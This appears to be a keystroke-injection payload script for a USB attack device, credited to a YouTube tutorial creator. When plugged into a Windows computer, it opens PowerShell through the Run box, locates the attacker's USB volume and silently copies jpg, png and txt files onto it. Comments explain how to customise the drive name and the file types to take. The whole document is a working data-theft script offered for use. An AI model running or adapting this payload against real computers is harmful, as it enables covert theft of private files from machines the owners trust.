//this script is made by Seytonic, the video can be found here: https://www.youtube.com/watch?v=I_BjCdJlCo4
layout('us') //set keyboard layout to us.
press("GUI r") //windows button + R (Run box)
delay(500)
type("powershell\n") //types powershell and presses enter, this doesn't open powershell in admin mode, see other files to do so.
delay(1000)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'YOUR_VOLUME_NAME' } | select name\n") //change YOUR_VOLUME_NAME to the name of your mounted usb volume.
var filetypes = ["jpg", "png", "txt"] // array of filetypes, add filetypes to your liking.
for (var i = 0; i < filetypes.length; i++) {
    type("copy */*." + filetypes[i] + " $usbpath.name\n") //copy files with your filetypes to your mounted usb volume.
}
type("exit\n") //exits powershell.
